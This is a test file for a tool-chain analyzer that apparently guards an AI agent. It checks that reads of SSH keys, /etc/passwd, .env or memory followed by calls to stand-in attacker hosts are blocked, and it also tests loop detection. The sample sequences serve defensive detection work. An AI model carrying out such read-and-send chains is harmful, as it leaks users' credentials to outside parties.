import { describe, it, expect } from "vitest";
import { ToolChainAnalyzer } from "../src/threat/tool-chain.js";
import type { DataClassification } from "../src/threat/classification.js";

const CLEAN: DataClassification = { labels: [], confidence: 0 };
const SENSITIVE: DataClassification = { labels: ["credentials"], confidence: 0.95 };

describe("ToolChainAnalyzer — exfiltration detection", () => {
  it("blocks read-of-secrets followed by web_fetch", () => {
    const a = new ToolChainAnalyzer();
    a.recordAndAnalyze("read", { path: "/home/user/.ssh/id_rsa" }, CLEAN);
    const r = a.recordAndAnalyze("web_fetch", { url: "https://attacker.example.com/" }, CLEAN);
    expect(r.blocked).toBe(true);
    expect(r.exfil).toBeTruthy();
  });

  it("blocks shell-cat-of-creds followed by http_request POST", () => {
    const a = new ToolChainAnalyzer();
    a.recordAndAnalyze("bash", { command: "cat /etc/passwd" }, CLEAN);
    const r = a.recordAndAnalyze("http_request", { url: "https://api.attacker.com/" }, CLEAN);
    expect(r.blocked).toBe(true);
  });

  it("does NOT block when the source read was a benign workspace file", () => {
    const a = new ToolChainAnalyzer();
    a.recordAndAnalyze("read", { path: "workspace/notes.md" }, CLEAN);
    const r = a.recordAndAnalyze("web_fetch", { url: "https://example.com/" }, CLEAN);
    expect(r.blocked).toBe(false);
  });

  it("flags the read sensitive even if classification is clean, when the path itself is sensitive", () => {
    const a = new ToolChainAnalyzer();
    // .env path is in the sensitivePatterns list — should taint the read regardless of content
    a.recordAndAnalyze("read", { path: ".env" }, CLEAN);
    const r = a.recordAndAnalyze("web_fetch", { url: "https://example.com/" }, CLEAN);
    expect(r.blocked).toBe(true);
  });

  it("flags any memory_search → external sink as exfiltration (memory is always sensitive)", () => {
    const a = new ToolChainAnalyzer();
    a.recordAndAnalyze("memory_search", { query: "user secrets" }, CLEAN);
    const r = a.recordAndAnalyze("browser", { action: "navigate", url: "https://attacker.com/" }, CLEAN);
    expect(r.blocked).toBe(true);
  });
});

describe("ToolChainAnalyzer — encoding-after-sensitive prep detection", () => {
  it("blocks a base64 shell command immediately after a sensitive read", () => {
    const a = new ToolChainAnalyzer();
    a.recordAndAnalyze("read", { path: "/.ssh/id_rsa" }, CLEAN);
    const r = a.recordAndAnalyze("bash", { command: "cat /tmp/x | base64" }, CLEAN);
    expect(r.blocked).toBe(true);
    expect(r.reason).toContain("Exfiltration prep");
  });

  it("does NOT block base64 by itself when no prior sensitive access", () => {
    const a = new ToolChainAnalyzer();
    const r = a.recordAndAnalyze("bash", { command: "echo hi | base64" }, CLEAN);
    expect(r.blocked).toBe(false);
  });
});

describe("ToolChainAnalyzer — loop detection", () => {
  it("triggers when the same call is repeated 12 times consecutively", () => {
    const a = new ToolChainAnalyzer();
    let last;
    for (let i = 0; i < 12; i++) {
      last = a.recordAndAnalyze("read", { path: "x.ts" }, CLEAN);
    }
    expect(last!.blocked).toBe(true);
    expect(last!.loopDetected).toMatch(/Tool loop/);
  });

  it("triggers ping-pong (A-B-A-B) at 4 alternations", () => {
    const a = new ToolChainAnalyzer();
    let last;
    for (let i = 0; i < 4; i++) {
      a.recordAndAnalyze("read", { path: "a.ts" }, CLEAN);
      last = a.recordAndAnalyze("read", { path: "b.ts" }, CLEAN);
    }
    expect(last!.blocked).toBe(true);
    expect(last!.loopDetected).toMatch(/Ping-pong/);
  });

  it("triggers triple-pattern (A-B-C-A-B-C) at 3 cycles", () => {
    const a = new ToolChainAnalyzer();
    let last;
    for (let i = 0; i < 3; i++) {
      a.recordAndAnalyze("read", { path: "a.ts" }, CLEAN);
      a.recordAndAnalyze("read", { path: "b.ts" }, CLEAN);
      last = a.recordAndAnalyze("read", { path: "c.ts" }, CLEAN);
    }
    expect(last!.blocked).toBe(true);
    expect(last!.loopDetected).toMatch(/Triple-pattern/);
  });

  it("does not flag normal varied tool use", () => {
    const a = new ToolChainAnalyzer();
    const calls = ["read", "grep", "bash", "edit", "write"];
    for (const c of calls) {
      const r = a.recordAndAnalyze(c, { path: `f-${c}` }, CLEAN);
      expect(r.blocked).toBe(false);
    }
  });
});

describe("ToolChainAnalyzer — reset", () => {
  it("reset clears history so a previously-blocking sequence becomes clean again", () => {
    const a = new ToolChainAnalyzer();
    a.recordAndAnalyze("read", { path: "/.ssh/id_rsa" }, CLEAN);
    a.reset();
    const r = a.recordAndAnalyze("web_fetch", { url: "https://example.com/" }, CLEAN);
    expect(r.blocked).toBe(false);
  });
});

describe("ToolChainAnalyzer — content classification taints the read", () => {
  it("treats a benign-path read as sensitive when classification flags credentials in the result", () => {
    const a = new ToolChainAnalyzer();
    a.recordAndAnalyze("read", { path: "workspace/output.txt" }, SENSITIVE);
    const r = a.recordAndAnalyze("web_fetch", { url: "https://example.com/" }, CLEAN);
    expect(r.blocked).toBe(true);
  });
});
